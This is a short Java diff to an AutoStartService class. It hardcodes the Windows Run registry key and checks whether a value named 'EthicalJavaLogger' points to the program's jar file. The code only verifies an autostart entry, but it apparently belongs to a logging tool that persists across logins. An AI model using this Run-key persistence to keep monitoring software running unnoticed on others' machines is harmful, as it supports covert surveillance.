@@ -8,16 +8,15 @@ public class AutoStartService {
     private String registryKey;
     private String jarPath;
     
-    public AutoStartService(String registryKey, String jarPath) {
-        this.registryKey = registryKey;
+    public AutoStartService(String jarPath) {
+        this.registryKey = "Software\\Microsoft\\Windows\\CurrentVersion\\Run";
         this.jarPath = jarPath;
     }
 
     public boolean checkRegistry() {
         try {
-            Preferences prefs = Preferences.userRoot().node(this.registryKey);
-            String valor = prefs.get("EthicalJavaLogger", null);
-            return this.jarPath.equals(valor);
+            String registryValue = Advapi32Util.registryGetStringValue(WinReg.HKEY_CURRENT_USER, this.registryKey, "EthicalJavaLogger");
+            return this.jarPath.equals(registryValue);
         } catch (Exception e) {
             return false;
         }
